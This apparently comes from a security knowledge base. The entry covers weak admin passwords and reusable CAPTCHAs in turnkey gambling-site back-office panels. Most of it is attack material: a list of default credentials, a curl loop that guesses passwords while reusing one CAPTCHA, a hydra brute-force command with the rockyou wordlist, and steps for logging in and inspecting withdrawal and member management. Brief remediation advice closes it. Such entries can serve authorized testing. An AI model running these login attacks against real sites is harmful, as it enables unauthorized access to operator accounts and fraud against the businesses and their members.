---
id: "operator-backend-weak-login"
title: "Weak operator-admin passwords + CAPTCHA reuse (the most common entry point on gambling sites)"
kind: "business-logic"
cve: null
related-cves: null
cve-note: "None (business logic)"
severity: "critical"
cvss: 9.1
severity-basis: "cvss"
severity-note: null
product: "Custom operator/agent admin panels (turnkey gambling platforms)"
versions: "Any"
ports: "80, 443, 8080, 8443"
keywords: "weak passwords, admin panel, CAPTCHA reuse, operator, turnkey gambling platform, login"
entry: "Login endpoints for /admin /manage /agent"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (business logic flaws; no CVE)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
/admin  /manage  /operator  /agent  /backend
POST /api/admin/login  {"username":"admin","password":"...","captcha":"..."}
```

Common defaults in turnkey gambling admin panels: `admin/admin`, `admin/123456`, `admin888`, `operator/operator`, `test/test123`; CAPTCHAs often **remain valid after verification**.

## Prerequisites

- An exposed admin entry point (not restricted to the internal network);
- A CAPTCHA endpoint that allows reuse (`/api/captcha`).

## PoC

```bash
# 1) Fetch a CAPTCHA once (record the cookie-to-code association)
curl -s -c /tmp/c.txt 'https://target/api/captcha' -o /tmp/cap.json && cat /tmp/cap.json

# 2) Try passwords repeatedly with the same code: continued attempts without changing the code = reuse flaw
for p in admin admin123 123456 admin888 operator888; do
  curl -s -b /tmp/c.txt -X POST 'https://target/api/admin/login' \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"admin\",\"password\":\"$p\",\"captcha\":\"<same-code>\"}" \
    -o /dev/null -w "$p %{http_code}\n"
done
# Confirmation: repeated requests return 200/{"code":0}-type responses (not CAPTCHA errors) = reuse confirmed
```

```bash
# 3) Brute force (rate-limited to no more than 20 attempts/minute)
hydra -l admin -P /usr/share/wordlists/rockyou.txt target https-post-form \
  "/api/admin/login:username=^USER^&password=^PASS^&captcha=8888:F=CAPTCHA error"
```

## Exploitation Steps

1. First check whether the CAPTCHA is invalidated (step 2);
2. If reusable, try a small dictionary (10–20 common passwords are enough);
3. After logging into the admin panel, first inspect "Withdrawal Review" and "Member Management" to determine the privilege level;
4. Evidence: one successful login request + response (redact the cookie).

## Remediation and Mitigation

- Make CAPTCHAs single-use with a 5-minute expiry; count failed logins by account + IP; restrict admin access to an IP allowlist.
- Enforce strong administrator passwords + 2FA.

## References

- OWASP WSTG-ATHN-01; common password samples for turnkey gambling admin panels.
